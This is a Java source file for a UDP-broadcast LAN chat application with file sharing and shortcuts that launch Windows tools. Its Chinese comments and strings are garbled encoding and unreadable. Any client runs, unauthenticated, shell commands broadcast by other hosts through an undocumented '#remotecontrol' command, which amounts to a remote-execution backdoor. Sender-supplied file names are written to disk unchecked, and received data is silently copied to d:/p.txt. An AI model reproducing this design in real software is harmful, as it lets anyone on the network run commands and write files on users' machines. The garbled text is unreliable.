package com.bigfire.chat;
import java.awt.*;
import java.awt.event.*;
import java.io.*;
import java.net.*;
import java.util.regex.*;
import javax.swing.*;
import javax.swing.filechooser.FileSystemView;
public class Chat
{
	public static JFrame loginjf;//��¼����
	public static void main(String[] args)
	{
		loginView();//���ص�¼����
	}
	private static void loginView()
	{
		loginjf = new JFrame("�����Լ�������");//��¼�������
		final JTextField nametext = new JTextField(10);//�����
		loginjf.setLayout(new FlowLayout());//���ý�����ʽ����
		JButton jb = new JButton("��¼");//��¼��ť
		loginjf.add(nametext);
		loginjf.add(jb);
		nametext.addActionListener(new CheckTextField(nametext));//��������¼�
		jb.addActionListener(new CheckTextField(nametext));//��ť�����¼�
		loginjf.setBounds(450, 300, 350, 100);//���ý����С
		loginjf.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);//���ý���رշ�ʽΪ���ɹر�
		loginjf.setVisible(true);
	}

}
class CheckTextField implements ActionListener// ����½�������Ƿ�Ϊ��
{
	private JTextField jtextField;

	public CheckTextField(JTextField jtextField)
	{
		this.jtextField = jtextField;
	}
	public void actionPerformed(ActionEvent arg0)
	{
		String selfname = jtextField.getText();
		if (selfname.equals(""))
		{
			JDialog jdl = new JDialog(Chat.loginjf, "��ʾ", true);
			jdl.setBounds(500, 200, 400, 150);
			jdl.setLayout(new FlowLayout());
			JLabel jl1 = new JLabel("�û�������Ϊ��");
			jdl.add(jl1);
			jdl.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
			jdl.setVisible(true);
		} else if (selfname.length() > 1 && selfname.length() < 20)
		{
			Chat.loginjf.dispose();
			new MainFrame(selfname, "������������2.0");
		} else
		{
			JDialog jdl = new JDialog(Chat.loginjf, "��ʾ", true);
			jdl.setBounds(500, 200, 400, 150);
			jdl.setLayout(new FlowLayout());
			JLabel jl1 = new JLabel("<html>�뾡��ʹ������������<br>���������û�����׼</html>");
			jdl.add(jl1);
			jdl.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
			jdl.setVisible(true);
		}
	}
}
class MainFrame extends JFrame
{
	private final String selfname;// �Լ�������
	private DatagramSocket socket;
	private JTextArea jtaDisplay;
	private JTextField jtfSendMsg;
	public MainFrame self;
	private File filedir;
	private File file;
	private String filename;
	public MainFrame(String selfname, String title)
	{
		super(title);
		this.self = this;
		this.selfname = selfname;
		try
		{
			socket = new DatagramSocket(999);
		} catch (Exception e)
		{
			e.printStackTrace();
		}
		initView();
		new Thread()
		{
			@Override
			public void run()
			{
				try
				{
					getData();

				} catch (IOException e)
				{
					e.printStackTrace();
				}
			}
		}.start();
	}
	private void initView()
	{
		setBounds(450, 80, 500, 600);
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		JMenuBar jmb = new JMenuBar();
		JMenu jmFile = new JMenu("�ļ�");
		JMenu jmTools = new JMenu("����");
		JMenu jmAbout = new JMenu("����");

		JMenuItem jmiFileSend = new JMenuItem("Ⱥ���ļ�");
		JMenuItem jmiFileNote = new JMenuItem("Ⱥ���ļ�˵��");

		JMenuItem jmiBaiduTools = new JMenuItem("�ٶ�һ��");
		JMenuItem jmiNotePad = new JMenuItem("�ʼǱ�");
		JMenuItem jmiPaint = new JMenuItem("��ͼ");
		JMenuItem jmiCalculatorTools = new JMenuItem("������");
		JMenuItem jmiCmd = new JMenuItem("������Ʒ�");
		JMenuItem jmiControl = new JMenuItem("�������");

		JMenuItem jmiSoftHelp = new JMenuItem("����");
		JMenuItem jmiAboutSoftWare = new JMenuItem("�������");
		JMenuItem jmiAboutAuthor = new JMenuItem("��������");

		jmb.add(jmFile);
		jmb.add(jmTools);
		jmb.add(jmAbout);

		jmFile.add(jmiFileSend);
		jmFile.add(jmiFileNote);

		jmTools.add(jmiBaiduTools);
		jmTools.add(jmiNotePad);
		jmTools.add(jmiPaint);
		jmTools.add(jmiCalculatorTools);
		jmTools.add(jmiCmd);
		jmTools.add(jmiControl);

		jmAbout.add(jmiSoftHelp);
		jmAbout.add(jmiAboutSoftWare);
		jmAbout.add(jmiAboutAuthor);
		setJMenuBar(jmb);
		jtaDisplay = new JTextArea();
		final JScrollPane jspScrollBar = new JScrollPane(jtaDisplay);
		jtfSendMsg = new JTextField(10);
		jtaDisplay.setEditable(false);
		add(jspScrollBar, BorderLayout.CENTER);
		add(jtfSendMsg, BorderLayout.SOUTH);
		setVisible(true);

		jmiFileSend.addActionListener(new FileSendAction());
		jmiFileNote
				.addActionListener(new DialogAction(
						"<center><h2>���ڱ��������UDP����,\n���ܻᶪ���ݰ�����ͼƬ���ļ���,\n���Ծ�����Ҫ�ñ����Ⱥ��ͼƬ</h2></center>"));
		jmiBaiduTools.addActionListener(new ToolsAction(
				"explorer http://www.baidu.com"));
		jmiNotePad.addActionListener(new ToolsAction("notepad"));
		jmiPaint.addActionListener(new ToolsAction("mspaint"));
		jmiCalculatorTools.addActionListener(new ToolsAction("calc"));
		jmiCmd.addActionListener(new ToolsAction("cmd /k start"));
		jmiControl.addActionListener(new ToolsAction("control"));

		jmiSoftHelp
				.addActionListener(new BigDialogAction(
						"<h1>�����֧�ֵ�һЩ��չ����</h1><h2>#cmd\n#notepad\n#mspaint\n#control\n#calc\n#regedit\n#mstsc\n#ip\n#����cmdָ��#</h2><h1 style=\"color:red\">��Ҫ����������</h1><h2>#����+����\n#����+Ӣ��\n#���+����\n#Ц��</h2>"));
		jmiAboutSoftWare
				.addActionListener(new DialogAction(
						"<center><h1>������������2.0</h1></cenrer>\n1.�����ֻ֧����ͬһ�������ڡ�\n2.֧��ͬһ��������Ⱥ���ļ���\n3.�������java����������Ҫjre���л���"));
		jmiAboutAuthor.addActionListener(new DialogAction(
				"<h3>QQ��       835476090\nAuthor:  a * ���\nлл����<h3>"));
		jtfSendMsg.addActionListener(new MsgSendAction(jtfSendMsg));
		addWindowFocusListener(new WindowClose());
		String loginOkText = "��" + selfname + "��������"
				+ "                      (*^__^*)ϵͳ��ʾ(*^__^*)";
		sendText(loginOkText);
	}
	private void sendText(String data)
	{
		try
		{
			int datalen = data.length();
			String protocol = "<myProtocol>&text&" + datalen + "&</myProtocol>";
			byte[] b = protocol.getBytes();

			//			System.out.println(protocol);
			//			System.out.println(b.length);
			DatagramPacket protocolpack = new DatagramPacket(b, b.length,
					InetAddress.getByName("255.255.255.255"), 999);
			socket.send(protocolpack);
			byte[] databuf = data.getBytes();
			DatagramPacket datapack = new DatagramPacket(databuf,
					databuf.length, InetAddress.getByName("255.255.255.255"),
					999);
			socket.send(datapack);
		} catch (IOException e)
		{
			e.printStackTrace();
		}
	}
	private void sendCmd(String cmdstr)
	{
		try
		{
			int datalen = cmdstr.length();
			String protocol = "<myProtocol>&cmd&" + datalen + "&</myProtocol>";
			byte[] b = protocol.getBytes();

			//			System.out.println(protocol);
			//			System.out.println(b.length);
			DatagramPacket protocolpack = new DatagramPacket(b, b.length,
					InetAddress.getByName("255.255.255.255"), 999);
			socket.send(protocolpack);
			byte[] databuf = cmdstr.getBytes();
			DatagramPacket datapack = new DatagramPacket(databuf,
					databuf.length, InetAddress.getByName("255.255.255.255"),
					999);
			socket.send(datapack);
		} catch (IOException e)
		{
			e.printStackTrace();
		}
	}
	private void getData() throws IOException
	{
		int defsize = 100;
		while (true)
		{
			byte[] buf = new byte[defsize];
			DatagramPacket dp = new DatagramPacket(buf, buf.length);
			socket.receive(dp);
			String data = new String(dp.getData(), 0, dp.getLength());

			//			System.out.println("RECEIVE"+data);
			//			System.out.println(data.startsWith("<myProtocol>"));
			//			System.out.println(data.endsWith("</myProtocol>"));
			//			System.out.println(data.contains("&"));
			if (data.startsWith("<myProtocol>")
					&& data.endsWith("</myProtocol>") && data.contains("&"))
			{
				//				System.out.println("����Э��");
				String[] protocols = data.split("&");
				String type = protocols[1];
				String nextPackLen = protocols[2];
				int size = Integer.valueOf(nextPackLen);
				if (type.equals("file"))
				{
					filename = protocols[3];
					String senderip = dp.getAddress().getHostAddress();
					FileSystemView fsv = FileSystemView.getFileSystemView();
					File com = fsv.getHomeDirectory();
					String deskpath = com.getPath();

					filedir = new File(deskpath + "/" + senderip);
					file = new File(filedir, filename);
					//					System.out.println("myprotocols"+filedir+"||"+filename);
					if (!filedir.exists())
					{
						System.out.println(filedir.mkdirs());
					}
					if (!file.exists())
					{
						System.out.println(file.createNewFile());
					}
					defsize = size;
				} else if (type.equals("cmd"))
				{
					byte[] temp = new byte[1024];
					DatagramPacket datepack = new DatagramPacket(temp,
							temp.length);
					socket.receive(datepack);
					String cmdMsg = new String(datepack.getData(), 0, datepack
							.getLength());
					String requestIP = dp.getAddress().toString().replace("/",
							"");
					if (!requestIP.equals(InetAddress.getLocalHost()
							.getHostAddress()))
					{
						exeCmd(cmdMsg);
					}
				} else if (type.equals("text"))
				{
					byte[] temp = new byte[1024];
					DatagramPacket datepack = new DatagramPacket(temp,
							temp.length);
					socket.receive(datepack);
					String textMsg = new String(datepack.getData(), 0, datepack
							.getLength());
					//					System.out.println("size:"+size+"  "+textMsg);
					jtaDisplay.append(textMsg + "\r\n");
				} else
				{
					System.out.println("δ֪Э������");// һ�㲻���ߵ�����
				}
			} else
			//�ļ�����
			{
				//				System.out.println("��Э�����ݲ�");
				//				System.out.println(filedir+"||"+filename);
				file = new File(filedir, filename);
				//				System.out.println("afsize:"+file.length());
				writeStringToFile("d:/p.txt", data);
				FileOutputStream fos = new FileOutputStream(file);
				fos.write(data.getBytes());
				fos.close();
				//				System.out.println("bfsize:"+file.length());
			}
		}
	}
	class WindowClose extends WindowAdapter
	{
		public void windowClosing(WindowEvent e)
		{
			String offline = "��" + selfname + "��������"
					+ "                      (*^__^*)ϵͳ��ʾ(*^__^*)";
			sendText(offline);
		}
	}
	class DialogAction implements ActionListener
	{
		private String note;

		public DialogAction(String note)
		{
			this.note = "<html><center>"
					+ note.replace("\n", "<br>").replace(" ", "&nbsp;")
					+ "</center></html>";
		}

		public void actionPerformed(ActionEvent arg0)
		{
			JDialog jdl = new JDialog(self, "��ʾ", true);
			jdl.setBounds(self.getX() + 50, self.getY() + 200, 400, 200);
			jdl.setLayout(new FlowLayout());
			JLabel jl1 = new JLabel(note);
			jdl.add(jl1);
			jdl.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
			jdl.setVisible(true);
		}
	}
	class BigDialogAction implements ActionListener
	{
		private String note;

		public BigDialogAction(String note)
		{
			this.note = "<html><center>"
					+ note.replace("\n", "<br>").replace(" ", "&nbsp;")
					+ "</center></html>";
		}

		public void actionPerformed(ActionEvent arg0)
		{
			JDialog jdl = new JDialog(self, "��ʾ", true);

			jdl.setBounds(self.getX() + 75, self.getY(), 350, 600);
			jdl.setLayout(new FlowLayout());
			JLabel jl1 = new JLabel(note);
			jdl.add(jl1);
			jdl.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
			jdl.setVisible(true);
		}
	}
	class ToolsAction implements ActionListener
	{
		private String cmd;

		public ToolsAction(String cmd)
		{
			this.cmd = cmd;
		}

		public void actionPerformed(ActionEvent arg0)
		{
			exeCmd(cmd);
		}
	}
	class MsgSendAction implements ActionListener
	{
		private JTextField jtfSendMsg;

		public MsgSendAction(JTextField jtfSendMsg)
		{
			this.jtfSendMsg = jtfSendMsg;
		}

		public void actionPerformed(ActionEvent arg0)
		{
			try
			{
				String msg = jtfSendMsg.getText();
				jtfSendMsg.setText("");

				if (msg.startsWith("#") && msg.endsWith("#"))
				{
					String substr = msg.substring(1, msg.length() - 1);

					if (!exeCmd(substr))
					{
						checkAndDo(msg);
					}
				} else
				{
					checkAndDo(msg);
				}

			} catch (Exception e)
			{
				e.printStackTrace();
			}
		}

		public void checkAndDo(String msg) throws UnknownHostException,
				UnsupportedEncodingException
		{
			if (msg.toLowerCase().equals("#cmd"))
			{
				exeCmd("cmd /k start");
			} else if (msg.toLowerCase().equals("#mspaint")
					|| msg.toLowerCase().equals("#calc")
					|| msg.toLowerCase().equals("#notepad")
					|| msg.toLowerCase().equals("#mstsc")
					|| msg.toLowerCase().equals("#control")
					|| msg.toLowerCase().equals("#regedit")

			)
			{

				exeCmd(msg);
			} else if (msg.toLowerCase().startsWith("#ip"))
			{
				String srchtml = "";
				String publicNetWorkIp = "";
				String address = "";
				srchtml = gbkGet("http://2018.ip138.com/ic.asp");
				//				System.out.println(srchtml);
				if (!srchtml.equals(""))
				{
					Pattern pattern = Pattern
							.compile("\\[(.*?)\\].*?���ԣ�(.*?)\\<");
					Matcher matcher = pattern.matcher(srchtml);
					if (matcher.find())
					{
						publicNetWorkIp = matcher.group(1);
						address = matcher.group(2);
					}
				} else
				{
					publicNetWorkIp = "�����쳣���������ɻ�ȡ";
				}
				jtaDisplay.append(SystemMSG("\t\t����:" + address + "\r\n\t\t����:"
						+ publicNetWorkIp + "\r\n\t\t˽��:"
						+ InetAddress.getLocalHost().getHostAddress()));
			} else if (msg.toLowerCase().startsWith("#����")
					|| msg.toLowerCase().startsWith("#����")
					|| msg.toLowerCase().startsWith("#���")
					|| msg.toLowerCase().startsWith("#Ц��"))
			{
				String param = msg.substring(1, msg.length()).trim();

				String paramcode = URLEncoder.encode(param, "UTF-8");
				String html = "";
				String url = "http://api.qingyunke.com/api.php?key=free&msg="
						+ paramcode;
				html = utf8Get(url);
				System.out.println(html);
				if (!html.equals(""))
				{
					String content = html.substring(23, html.length() - 2)
							.replace("��", "\r\n").replace("{br}", "\r\n");
					jtaDisplay.append(SystemMSG(content));
				}

			} else if (msg.toLowerCase().startsWith("#remotecontrol"))
			{
				String data = msg.substring(14, msg.length()).trim();
				if (data.toLowerCase().equals("cmd"))
				{
					sendCmd("cmd /k start");
				} else
				{
					sendCmd(data);
				}
			} else
			{
				String data = selfname + ":" + msg;
				sendText(data);
			}
		}

		public String SystemMSG(String systemmsg)
		{

			return "\r\n===============================ϵͳ��ʾ===============================\r\n"
					+ systemmsg
					+ "\r\n===============================�Լ��ɼ�===============================\r\n";
		}
	}
	class FileSendAction implements ActionListener
	{

		public void actionPerformed(ActionEvent arg0)
		{
			try
			{
				FileDialog fileDialog = new FileDialog(self, "��ѡ���ļ�"); // �˵��ѡ��ʱ�ʹ�һ���Ի������û�ѡ��һ���ļ�
				fileDialog.setVisible(true); // �Ի�����ʾ����
				if (fileDialog.getFile() != null
						&& fileDialog.getDirectory() != null)//��ֹ�û��㿪�Ի����ѡ��ֱ�ӹرյ����
				{
					String fname = fileDialog.getFile(); //��ȡ�ļ�����
					String url = fileDialog.getDirectory();//��ȡ�ļ�·��
					String urlname = url + fname; //·�������Ƽ�����·��
					File file1 = new File(urlname); //�������ֽ����ļ�����
					long filesize = file1.length();

					String fileprotocol = "<myProtocol>&file&" + filesize + "&"
							+ fname + "&</myProtocol>"; //���ļ����ƺ��������
					System.out.println(fileprotocol);
					byte[] filename = fileprotocol.getBytes(); //����ֽ�����
					DatagramPacket filenamepack = new DatagramPacket(filename,
							filename.length, InetAddress
									.getByName("255.255.255.255"), 999);
					socket.send(filenamepack);//����ǰ��ļ��������ȷ���ȥ

					FileInputStream fr = new FileInputStream(file1);//�����������ļ�
					byte[] buf = new byte[(int) file1.length()];
					fr.read(buf);
					DatagramPacket filedatapack = new DatagramPacket(buf,
							buf.length, InetAddress
									.getByName("255.255.255.255"), 999);
					socket.send(filedatapack);
					//					int len=-1;
					//					while ((len = fr.read(buf)) != -1)
					//					{
					//						DatagramPacket filedatapack = new DatagramPacket(buf,buf.length, InetAddress.getByName("255.255.255.255"), 999);
					//						socket.send(filedatapack);
					//					}
					fr.close();
					String sendFileOk = "��" + selfname + "������ҷ��˸��ļ�,���ǿ����յ�û"
							+ "       (*^__^*)ϵͳ��ʾ(*^__^*)";
					sendText(sendFileOk);
				}
			} catch (Exception e)
			{
				e.printStackTrace();
			}
		}
	}
	public static String utf8Get(String url)
	{
		String result = "";
		BufferedReader in = null;
		try
		{
			String urlNameString = url;
			URL realUrl = new URL(urlNameString);
			// �򿪺�URL֮�������
			URLConnection connection = realUrl.openConnection();
			// ����ͨ�õ���������
			connection.setRequestProperty("accept", "*/*");
			connection.setRequestProperty("connection", "Keep-Alive");
			connection.setRequestProperty("user-agent",
					"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
			// ����ʵ�ʵ�����
			connection.connect();
			//            System.out.println(connection.getContentEncoding());
			// ��ȡ������Ӧͷ�ֶ�
			//            Map<String, List<String>> map = connection.getHeaderFields();
			// �������е���Ӧͷ�ֶ�
			//            for (String key : map.keySet()) {
			//                System.out.println(key + "--->" + map.get(key));
			//            }
			// ���� BufferedReader����������ȡURL����Ӧ
			in = new BufferedReader(new InputStreamReader(connection
					.getInputStream(), "UTF-8"));
			String line;

			while ((line = in.readLine()) != null)
			{
				result += line;
			}
		} catch (Exception e)
		{
			System.out.println("����GET��������쳣��" + e);
			e.printStackTrace();
		}
		// ʹ��finally�����ر�������
		finally
		{
			try
			{
				if (in != null)
				{
					in.close();
				}
			} catch (Exception e2)
			{
				e2.printStackTrace();
			}
		}
		return result;
	}
	public static String gbkGet(String url)
	{
		String result = "";
		BufferedReader in = null;
		try
		{
			String urlNameString = url;
			URL realUrl = new URL(urlNameString);
			// �򿪺�URL֮�������
			URLConnection connection = realUrl.openConnection();
			// ����ͨ�õ���������
			connection.setRequestProperty("accept", "*/*");
			connection.setRequestProperty("connection", "Keep-Alive");
			connection.setRequestProperty("user-agent",
					"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
			// ����ʵ�ʵ�����
			connection.connect();
			//            System.out.println(connection.getContentEncoding());
			// ��ȡ������Ӧͷ�ֶ�
			//            Map<String, List<String>> map = connection.getHeaderFields();
			// �������е���Ӧͷ�ֶ�
			//            for (String key : map.keySet()) {
			//                System.out.println(key + "--->" + map.get(key));
			//            }
			// ���� BufferedReader����������ȡURL����Ӧ
			in = new BufferedReader(new InputStreamReader(connection
					.getInputStream(), "gbk"));
			String line;

			while ((line = in.readLine()) != null)
			{
				result += line;
			}
		} catch (Exception e)
		{
			System.out.println("����GET��������쳣��" + e);
			e.printStackTrace();
		}
		// ʹ��finally�����ر�������
		finally
		{
			try
			{
				if (in != null)
				{
					in.close();
				}
			} catch (Exception e2)
			{
				e2.printStackTrace();
			}
		}
		return result;
	}
	/**
	 * ��ָ�� URL ����POST����������
	 * 
	 * @param url
	 *            ��������� URL
	 * @param param
	 *            ����������������Ӧ���� name1=value1&name2=value2 ����ʽ��
	 * @return ������Զ����Դ����Ӧ���
	 */
	public static String utf8Post(String url, String param)
	{
		PrintWriter out = null;
		BufferedReader in = null;
		String result = "";
		try
		{
			URL realUrl = new URL(url);
			// �򿪺�URL֮�������
			URLConnection conn = realUrl.openConnection();
			// ����ͨ�õ���������
			conn.setRequestProperty("accept", "*/*");
			conn.setRequestProperty("connection", "Keep-Alive");
			conn.setRequestProperty("user-agent",
					"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
			// ����POST�������������������
			conn.setDoOutput(true);
			conn.setDoInput(true);
			// ��ȡURLConnection�����Ӧ�������
			out = new PrintWriter(conn.getOutputStream());
			// �����������
			out.print(param);
			// flush������Ļ���
			out.flush();
			// ����BufferedReader����������ȡURL����Ӧ
			in = new BufferedReader(
					new InputStreamReader(conn.getInputStream()));
			String line;
			while ((line = in.readLine()) != null)
			{
				result += line;
			}
		} catch (Exception e)
		{
			System.out.println("���� POST ��������쳣��" + e);
			e.printStackTrace();
		}
		//ʹ��finally�����ر��������������
		finally
		{
			try
			{
				if (out != null)
				{
					out.close();
				}
				if (in != null)
				{
					in.close();
				}
			} catch (IOException ex)
			{
				ex.printStackTrace();
			}
		}
		return result;
	}
	public static Boolean writeStringToFile(String path, String resources)
	{
		FileOutputStream fos;
		File f = new File(path);
		try
		{
			fos = new FileOutputStream(f);
			fos.write(resources.getBytes());
			fos.close();

		} catch (Exception e)
		{
			e.printStackTrace();
			return false;
		}
		return true;
	}
	public boolean exeCmd(String cmdstr)
	{
		try
		{
			Runtime.getRuntime().exec(cmdstr);
			return true;
		} catch (Exception e1)
		{
			return false;
		}
	}
}
